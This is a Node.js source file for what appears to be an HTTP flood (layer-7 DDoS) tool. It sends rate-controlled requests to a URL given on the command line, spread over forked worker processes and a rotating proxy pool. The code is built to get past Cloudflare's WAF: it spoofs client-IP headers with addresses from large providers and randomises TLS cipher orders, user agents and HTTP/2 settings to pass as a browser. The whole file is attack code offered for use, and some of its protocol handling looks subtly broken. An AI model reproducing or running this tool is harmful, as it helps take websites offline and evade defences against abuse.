// Enhanced HTTP/2 + HTTP/1.1 script with improved proxy management and Cloudflare WAF evasion
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const { Buffer } = require('buffer');

// Enhanced proxy management with health checking and rotation
class ProxyManager {
  constructor(proxyFile) {
    this.proxies = [];
    this.healthyProxies = [];
    this.failedProxies = new Map();
    this.loadProxies(proxyFile);
    this.startHealthCheck();
  }

  loadProxies(proxyFile) {
    const proxyData = fs.readFileSync(proxyFile, 'utf8').replace(/\r/g, '').split('\n');
    
    this.proxies = proxyData
      .map(line => {
        const [host, port, username, password] = line.split(':');
        if (host && port && !isNaN(port)) {
          return {
            host: host.trim(),
            port: parseInt(port),
            username: username || null,
            password: password || null,
            lastUsed: 0,
            successCount: 0,
            failureCount: 0,
            responseTime: 0,
            isHealthy: true
          };
        }
        return null;
      })
      .filter(proxy => proxy !== null);

    if (this.proxies.length === 0) {
      console.error('No valid proxies found');
      process.exit(1);
    }

    this.healthyProxies = [...this.proxies];
    console.log(`Loaded ${this.proxies.length} proxies`);
  }

  getRandomProxy() {
    if (this.healthyProxies.length === 0) {
      this.healthyProxies = [...this.proxies];
      this.failedProxies.clear();
    }

    // Weighted selection based on performance
    const weights = this.healthyProxies.map(proxy => {
      const successRate = proxy.successCount / (proxy.successCount + proxy.failureCount + 1);
      const responseWeight = Math.max(0, 1000 - proxy.responseTime);
      return successRate * responseWeight;
    });

    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);
    let random = Math.random() * totalWeight;

    for (let i = 0; i < this.healthyProxies.length; i++) {
      random -= weights[i];
      if (random <= 0) {
        return this.healthyProxies[i];
      }
    }

    return this.healthyProxies[Math.floor(Math.random() * this.healthyProxies.length)];
  }

  markProxySuccess(proxy, responseTime) {
    proxy.successCount++;
    proxy.responseTime = (proxy.responseTime + responseTime) / 2;
    proxy.lastUsed = Date.now();
  }

  markProxyFailure(proxy) {
    proxy.failureCount++;
    const failureRate = proxy.failureCount / (proxy.successCount + proxy.failureCount);
    
    if (failureRate > 0.6) {
      const index = this.healthyProxies.indexOf(proxy);
      if (index > -1) {
        this.healthyProxies.splice(index, 1);
        this.failedProxies.set(`${proxy.host}:${proxy.port}`, Date.now());
        proxy.isHealthy = false;
      }
    }
  }

  startHealthCheck() {
    setInterval(() => {
      const now = Date.now();
      for (const [proxyKey, failedTime] of this.failedProxies.entries()) {
        if (now - failedTime > 300000) { // 5 minutes recovery
          const [host, port] = proxyKey.split(':');
          const proxy = this.proxies.find(p => p.host === host && p.port === parseInt(port));
          if (proxy && !this.healthyProxies.includes(proxy)) {
            this.healthyProxies.push(proxy);
            this.failedProxies.delete(proxyKey);
            proxy.isHealthy = true;
          }
        }
      }
    }, 60000);
  }
}

// Enhanced IP rotation and header spoofing
class IPRotationManager {
  constructor() {
    this.legitIPs = this.generateLegitIPPool();
    this.currentIPIndex = 0;
    this.ipRotationInterval = 30000; // 30 seconds
    this.startIPRotation();
  }

  generateLegitIPPool() {
    const asnData = [
      { asn: "AS15169", country: "US", ip: "8.8.8." },
      { asn: "AS8075", country: "US", ip: "13.107.21." },
      { asn: "AS14061", country: "SG", ip: "104.18.32." },
      { asn: "AS13335", country: "NL", ip: "162.158.78." },
      { asn: "AS16509", country: "DE", ip: "3.120.0." },
      { asn: "AS14618", country: "JP", ip: "52.192.0." },
      { asn: "AS32934", country: "US", ip: "157.240.0." },
      { asn: "AS54113", country: "US", ip: "104.244.42." },
      { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];

    const ipPool = [];
    for (let i = 0; i < 50; i++) {
      const data = asnData[Math.floor(Math.random() * asnData.length)];
      ipPool.push(`${data.ip}${Math.floor(Math.random() * 255)}`);
    }
    return ipPool;
  }

  getCurrentIP() {
    return this.legitIPs[this.currentIPIndex];
  }

  rotateIP() {
    this.currentIPIndex = (this.currentIPIndex + 1) % this.legitIPs.length;
  }

  startIPRotation() {
    setInterval(() => {
      this.rotateIP();
    }, this.ipRotationInterval);
  }

  generateAlternativeIPHeaders() {
    const currentIP = this.getCurrentIP();
    const headers = {};

    if (Math.random() < 0.5) headers["cdn-loop"] = `${currentIP}:${this.randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = currentIP;
    if (Math.random() < 0.5) headers["via"] = `1.1 ${currentIP}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${this.randstr(8)};ip=${currentIP}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = currentIP;
    if (Math.random() < 0.3) headers["x-coming-from"] = currentIP;
    if (Math.random() < 0.4) headers["akamai-client-ip"] = currentIP;

    if (Object.keys(headers).length === 0) {
      headers["cdn-loop"] = `${currentIP}:${this.randstr(5)}`;
    }

    return headers;
  }

  randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }
}

// Enhanced TLS fingerprint generation
class TLSFingerprintManager {
  constructor() {
    this.fingerprints = this.generateFingerprintPool();
    this.currentFingerprintIndex = 0;
  }

  generateFingerprintPool() {
    const fingerprints = [];
    
    for (let i = 0; i < 20; i++) {
      const browser = Math.random() < 0.5 ? 'chrome' : 'firefox';
      const version = Math.floor(Math.random() * 4) + 130; // Chrome 130-133
      
      fingerprints.push({
        browser,
        version,
        userAgent: this.generateUserAgent(browser, version),
        ja3: this.generateJA3Fingerprint(),
        http2Settings: this.generateHTTP2Settings(),
        plugins: this.generatePlugins(browser)
      });
    }
    
    return fingerprints;
  }

  getCurrentFingerprint() {
    return this.fingerprints[this.currentFingerprintIndex];
  }

  rotateFingerprint() {
    this.currentFingerprintIndex = (this.currentFingerprintIndex + 1) % this.fingerprints.length;
  }

  generateUserAgent(browser, version) {
    const platforms = [
      'Windows NT 10.0; Win64; x64',
      'Windows NT 11.0; Win64; x64',
      'Macintosh; Intel Mac OS X 10_15_7',
      'X11; Linux x86_64'
    ];
    
    const platform = platforms[Math.floor(Math.random() * platforms.length)];
    
    if (browser === 'chrome') {
      return `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
    } else {
      return `Mozilla/5.0 (${platform}; rv:${version - 20}.0) Gecko/20100101 Firefox/${version - 20}.0`;
    }
  }

  generateJA3Fingerprint() {
    const ciphers = [
      'TLS_AES_128_GCM_SHA256',
      'TLS_AES_256_GCM_SHA384',
      'TLS_CHACHA20_POLY1305_SHA256',
      'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
      'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
      'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
      'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
      'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
      'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
    ];

    const signatureAlgorithms = [
      'ecdsa_secp256r1_sha256',
      'rsa_pss_rsae_sha256',
      'rsa_pkcs1_sha256',
      'ecdsa_secp384r1_sha384',
      'rsa_pss_rsae_sha384',
      'rsa_pkcs1_sha384'
    ];

    const curves = ['X25519', 'secp256r1', 'secp384r1'];
    const extensions = ['0', '5', '10', '13', '16', '18', '23', '27', '35', '43', '45', '51', '65281'];

    return {
      ciphers: this.shuffleArray([...ciphers]),
      signatureAlgorithms: this.shuffleArray([...signatureAlgorithms]),
      curves: this.shuffleArray([...curves]),
      extensions: this.shuffleArray([...extensions])
    };
  }

  generateHTTP2Settings() {
    return {
      HEADER_TABLE_SIZE: [4096, 16384][Math.floor(Math.random() * 2)],
      ENABLE_PUSH: 0,
      MAX_CONCURRENT_STREAMS: Math.floor(Math.random() * 400) + 100,
      INITIAL_WINDOW_SIZE: [65535, 262144][Math.floor(Math.random() * 2)],
      MAX_FRAME_SIZE: [16384, 65536][Math.floor(Math.random() * 2)],
      MAX_HEADER_LIST_SIZE: [8192, 32768][Math.floor(Math.random() * 2)],
      ENABLE_CONNECT_PROTOCOL: [0, 1][Math.floor(Math.random() * 2)]
    };
  }

  generatePlugins(browser) {
    const basePlugins = [
      { name: "Chrome PDF Plugin", description: "Portable Document Format", filename: "internal-pdf-viewer", mimeTypes: ["application/pdf"] }
    ];

    if (browser === 'chrome') {
      basePlugins.push(
        { name: "Native Client", description: "Native Client", filename: "internal-nacl-plugin", mimeTypes: ["application/x-nacl"] }
      );
    }

    return {
      count: basePlugins.length,
      list: basePlugins
    };
  }

  shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
  }
}

// Enhanced connection management
class ConnectionManager {
  constructor() {
    this.activeConnections = new Map();
    this.connectionPool = new Map();
    this.maxConnectionsPerProxy = 5;
  }

  async createConnection(proxy, target) {
    const proxyKey = `${proxy.host}:${proxy.port}`;
    
    // Check if we have available connections in pool
    if (this.connectionPool.has(proxyKey)) {
      const pool = this.connectionPool.get(proxyKey);
      if (pool.length > 0) {
        return pool.pop();
      }
    }

    return new Promise((resolve, reject) => {
      const netSocket = net.connect(proxy.port, proxy.host, () => {
        const startTime = Date.now();
        
        // Send CONNECT request
        const connectRequest = `CONNECT ${target.host}:${target.port} HTTP/1.1\r\nHost: ${target.host}:${target.port}\r\nConnection: Keep-Alive\r\n\r\n`;
        
        netSocket.write(connectRequest, () => {
          netSocket.once('data', (data) => {
            if (data.toString().includes('200')) {
              const responseTime = Date.now() - startTime;
              proxyManager.markProxySuccess(proxy, responseTime);
              resolve(netSocket);
            } else {
              proxyManager.markProxyFailure(proxy);
              netSocket.destroy();
              reject(new Error('Proxy connection failed'));
            }
          });
        });
      });

      netSocket.on('error', (error) => {
        proxyManager.markProxyFailure(proxy);
        reject(error);
      });

      netSocket.setTimeout(10000, () => {
        proxyManager.markProxyFailure(proxy);
        netSocket.destroy();
        reject(new Error('Connection timeout'));
      });
    });
  }

  returnConnection(proxy, socket) {
    const proxyKey = `${proxy.host}:${proxy.port}`;
    
    if (!this.connectionPool.has(proxyKey)) {
      this.connectionPool.set(proxyKey, []);
    }
    
    const pool = this.connectionPool.get(proxyKey);
    if (pool.length < this.maxConnectionsPerProxy) {
      pool.push(socket);
    } else {
      socket.destroy();
    }
  }
}

// Initialize managers
const proxyManager = new ProxyManager(process.argv[7]);
const ipManager = new IPRotationManager();
const fingerprintManager = new TLSFingerprintManager();
const connectionManager = new ConnectionManager();

// Enhanced request function with improved evasion
async function sendRequest() {
  try {
    const proxy = proxyManager.getRandomProxy();
    const fingerprint = fingerprintManager.getCurrentFingerprint();
    
    // Rotate fingerprint every 10 requests
    if (Math.random() < 0.1) {
      fingerprintManager.rotateFingerprint();
    }

    const url = new URL(process.argv[3]);
    const connection = await connectionManager.createConnection(proxy, {
      host: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80)
    });

    // Create TLS connection with enhanced fingerprint
    const tlsSocket = tls.connect({
      socket: connection,
      ALPNProtocols: ['h2', 'http/1.1'],
      servername: url.hostname,
      ciphers: fingerprint.ja3.ciphers.join(':'),
      sigalgs: fingerprint.ja3.signatureAlgorithms.join(':'),
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
      rejectUnauthorized: false,
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3'
    }, () => {
      if (tlsSocket.alpnProtocol === 'h2') {
        sendHTTP2Request(tlsSocket, url, fingerprint);
      } else {
        sendHTTP11Request(tlsSocket, url, fingerprint);
      }
    });

    tlsSocket.on('error', () => {
      connectionManager.returnConnection(proxy, connection);
    });

  } catch (error) {
    // Handle errors silently and retry
    setTimeout(sendRequest, Math.random() * 1000);
  }
}

function sendHTTP2Request(socket, url, fingerprint) {
  // HTTP/2 implementation with enhanced headers
  const hpack = new HPACK();
  const streamId = 1;
  
  const headers = [
    [':method', process.argv[2] || 'GET'],
    [':authority', url.hostname],
    [':scheme', 'https'],
    [':path', url.pathname + url.search],
    ['user-agent', fingerprint.userAgent],
    ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'],
    ['accept-language', 'en-US,en;q=0.5'],
    ['accept-encoding', 'gzip, deflate, br'],
    ['dnt', '1'],
    ['connection', 'keep-alive'],
    ['upgrade-insecure-requests', '1'],
    ['sec-fetch-dest', 'document'],
    ['sec-fetch-mode', 'navigate'],
    ['sec-fetch-site', 'none'],
    ['sec-fetch-user', '?1'],
    ['cache-control', 'max-age=0']
  ];

  // Add alternative IP headers
  const altHeaders = ipManager.generateAlternativeIPHeaders();
  Object.entries(altHeaders).forEach(([key, value]) => {
    headers.push([key, value]);
  });

  const packed = Buffer.concat([
    Buffer.from([0x80, 0, 0, 0, 0xFF]),
    hpack.encode(headers)
  ]);

  const frame = encodeFrame(streamId, 1, packed, 0x25);
  socket.write(frame);

  socket.on('data', (data) => {
    // Handle response
    socket.end();
    connectionManager.returnConnection(proxyManager.getRandomProxy(), socket);
  });
}

function sendHTTP11Request(socket, url, fingerprint) {
  const headers = [
    `Host: ${url.hostname}`,
    `User-Agent: ${fingerprint.userAgent}`,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Cache-Control: max-age=0'
  ];

  // Add alternative IP headers
  const altHeaders = ipManager.generateAlternativeIPHeaders();
  Object.entries(altHeaders).forEach(([key, value]) => {
    headers.push(`${key}: ${value}`);
  });

  const request = `${process.argv[2] || 'GET'} ${url.pathname}${url.search} HTTP/1.1\r\n${headers.join('\r\n')}\r\n\r\n`;
  
  socket.write(request);
  socket.on('data', () => {
    socket.end();
    connectionManager.returnConnection(proxyManager.getRandomProxy(), socket);
  });
}

// HTTP/2 frame encoding functions
function encodeFrame(streamId, type, payload = "", flags = 0) {
  let frame = Buffer.alloc(9);
  frame.writeUInt32BE(payload.length << 8 | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload.length > 0) {
    frame = Buffer.concat([frame, payload]);
  }
  return frame;
}

// Main execution
if (cluster.isMaster) {
  const workerCount = Math.min(process.argv[5], os.cpus().length * 2);
  
  for (let i = 0; i < workerCount; i++) {
    cluster.fork();
  }
  
  console.log(`Started ${workerCount} workers`);
  
  cluster.on('exit', (worker) => {
    cluster.fork();
  });
} else {
  // Worker process
  const rateLimit = parseInt(process.argv[6]) || 100;
  const interval = 1000 / rateLimit;
  
  setInterval(() => {
    sendRequest();
  }, interval);
  
  // Exit after specified time
  setTimeout(() => {
    process.exit(0);
  }, parseInt(process.argv[4]) * 1000);
}